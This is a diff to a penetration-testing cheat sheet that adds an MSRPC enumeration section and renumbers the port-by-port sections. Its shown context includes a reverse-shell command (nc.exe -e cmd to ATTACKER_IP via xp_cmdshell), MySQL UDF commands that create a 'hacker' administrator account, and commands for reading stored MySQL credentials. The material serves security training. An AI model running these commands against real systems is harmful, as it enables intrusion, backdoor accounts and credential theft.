@@ -27,17 +27,18 @@ Other great cheetsheets:
   - [3.9. 110,995 - POP Enumeration](#39-110995---pop-enumeration)
   - [3.10. 111 - RPCbind Enumeration](#310-111---rpcbind-enumeration)
   - [3.11. 119 - NNTP Enumeration](#311-119---nntp-enumeration)
-  - [3.12. 445 - SMB Enumeration](#312-445---smb-enumeration)
-    - [3.12.1. Listing SMB Shares](#3121-listing-smb-shares)
-    - [3.12.2. Interacting on SMB](#3122-interacting-on-smb)
-  - [3.13. 1433 - Microsoft SQL Server Enumeration](#313-1433---microsoft-sql-server-enumeration)
-    - [3.13.1. MS SQL Server Command Execution](#3131-ms-sql-server-command-execution)
-  - [3.14. 2049 - NFS Enumeration](#314-2049---nfs-enumeration)
-  - [3.15. 3306 - MySQL Enumeration](#315-3306---mysql-enumeration)
-    - [3.15.1. MySQL UDF Exploit](#3151-mysql-udf-exploit)
-    - [3.15.2. Grabbing MySQL Passwords](#3152-grabbing-mysql-passwords)
-    - [3.15.3. Useful MySQL Files](#3153-useful-mysql-files)
-  - [3.16. 5900 - VNC Enumeration](#316-5900---vnc-enumeration)
+  - [3.12. 135 - MSRPC Enumeration](#312-135---msrpc-enumeration)
+  - [3.13. 445 - SMB Enumeration](#313-445---smb-enumeration)
+    - [3.13.1. Listing SMB Shares](#3131-listing-smb-shares)
+    - [3.13.2. Interacting on SMB](#3132-interacting-on-smb)
+  - [3.14. 1433 - Microsoft SQL Server Enumeration](#314-1433---microsoft-sql-server-enumeration)
+    - [3.14.1. MS SQL Server Command Execution](#3141-ms-sql-server-command-execution)
+  - [3.15. 2049 - NFS Enumeration](#315-2049---nfs-enumeration)
+  - [3.16. 3306 - MySQL Enumeration](#316-3306---mysql-enumeration)
+    - [3.16.1. MySQL UDF Exploit](#3161-mysql-udf-exploit)
+    - [3.16.2. Grabbing MySQL Passwords](#3162-grabbing-mysql-passwords)
+    - [3.16.3. Useful MySQL Files](#3163-useful-mysql-files)
+  - [3.17. 5900 - VNC Enumeration](#317-5900---vnc-enumeration)
 - [4. Exploitation](#4-exploitation)
   - [4.1. Searchsploit](#41-searchsploit)
   - [4.2. Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
@@ -421,7 +422,23 @@ QUIT
 # https://tools.ietf.org/html/rfc977
 ```
 
-## 3.12. 445 - SMB Enumeration
+## 3.12. 135 - MSRPC Enumeration
+
+```sh
+# see the services available through MSRPC
+impacket-rpcdump $VICTIM_IP | tee rpcdump.log
+# lsa/samr ones let you enumerate users
+
+# interact with MSRPC
+# via null session:
+rpcclient $VICTIM_IP -U "" -N
+# authenticated:
+rpcclient $VICTIM_IP -W DOMAIN -U username -P password
+# from here can enumerate users, groups, etc.
+# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)
+```
+
+## 3.13. 445 - SMB Enumeration
 
 Use `enum4linux` or `smbmap` to gather tons of basic info (users, groups,
 shares, etc.)
@@ -430,28 +447,28 @@ Definitely look at [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 
 ```sh
 # list available shares
-smbmap -H VICTIM_IP
+smbmap -H $VICTIM_IP
 
 # list (only) windows version
-smbmap -vH VICTIM_IP
+smbmap -vH $VICTIM_IP
 
 # recursively list directory contents
-smbmap -RH VICTIM_IP
+smbmap -RH $VICTIM_IP
 
 # try executing a command using wmi (can try psexec with '--mode psexec')
-smbmap -x 'ipconfig' VICTIM_IP
+smbmap -x 'ipconfig' $VICTIM_IP
 
 # standard scan
-enum4linux VICTIM_IP
+enum4linux $VICTIM_IP
 
 # scan all the things
-enum4linux -aMld VICTIM_IP | tee enum4linux.log
+enum4linux -aMld $VICTIM_IP | tee enum4linux.log
 
 # nmap script scans
-nmap --script="safe and smb-*" -n -v -p 445 VICTIM_IP
+nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
 ```
 
-### 3.12.1. Listing SMB Shares
+### 3.13.1. Listing SMB Shares
 
 ```sh
 # List shares without creds
@@ -461,7 +478,7 @@ smbclient -N -L VICTIM_IP
 smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
 ```
 
-### 3.12.2. Interacting on SMB
+### 3.13.2. Interacting on SMB
 
 ```sh
 # Opens an interactive smb shell that you have creds for
@@ -472,7 +489,7 @@ smb:\> ls  # list files
 smb:\> get filename.txt  # fetch a file
 ```
 
-## 3.13. 1433 - Microsoft SQL Server Enumeration
+## 3.14. 1433 - Microsoft SQL Server Enumeration
 
 Microsoft SQL Server (default port TCP 1433) is a relational database management
 system developed by Microsoft. It supports storing and retrieving data across
@@ -480,7 +497,7 @@ a network (including the Internet).
 
 ```sh
 # if you know nothing about it, try 'sa' user w/o password:
-nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql VICTIM_IP
+nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
 # if you don't have creds, you can try to guess them, but be careful not to block
 # accounts with too many bad guesses
 ```
@@ -489,7 +506,7 @@ See [Password Bruteforcing and Cracking](#42-password-bruteforcing-and-cracking)
 
 More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
 
-### 3.13.1. MS SQL Server Command Execution
+### 3.14.1. MS SQL Server Command Execution
 
 ```sh
 # Log in using service account creds if able
@@ -524,7 +541,7 @@ xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
 go
 ```
 
-## 3.14. 2049 - NFS Enumeration
+## 3.15. 2049 - NFS Enumeration
 
 ```sh
 # scan with scripts
@@ -554,7 +571,7 @@ sudo groupadd -g 1010 tempgroup
 sudo usermod -a -G tempgroup tempuser
 ```
 
-## 3.15. 3306 - MySQL Enumeration
+## 3.16. 3306 - MySQL Enumeration
 
 MySQL listens on `TCP 3306` by default. You'll see it during a port scan or when
 running `netstat -tnl`.
@@ -628,7 +645,7 @@ use information_schema; select grantee, table_schema, privilege_type from schema
 select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
 ```
 
-### 3.15.1. MySQL UDF Exploit
+### 3.16.1. MySQL UDF Exploit
 
 Exploiting User-Defined Functions in MySQL to get shell execution. First,
 ready the UDF library (provides `sys_exec` function) locally on the server.
@@ -681,7 +698,7 @@ SELECT sys_exec("net user hacker P@$$w0rd /add");
 SELECT sys_exec("net localgroup Administrators hacker /add");
 ```
 
-### 3.15.2. Grabbing MySQL Passwords
+### 3.16.2. Grabbing MySQL Passwords
 
 ```sh
 # contains plain-text password of the user debian-sys-maint
@@ -691,7 +708,7 @@ cat /etc/mysql/debian.cnf
 grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
 ```
 
-### 3.15.3. Useful MySQL Files
+### 3.16.3. Useful MySQL Files
 
 - Configuration Files:
   - Windows
@@ -714,7 +731,7 @@ grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_na
   - update.log
   - common.log
 
-## 3.16. 5900 - VNC Enumeration
+## 3.17. 5900 - VNC Enumeration
 
 VNC is a graphical remote desktop sharing system. Other ports involved in it
 are: 5800,5801,5900,5901
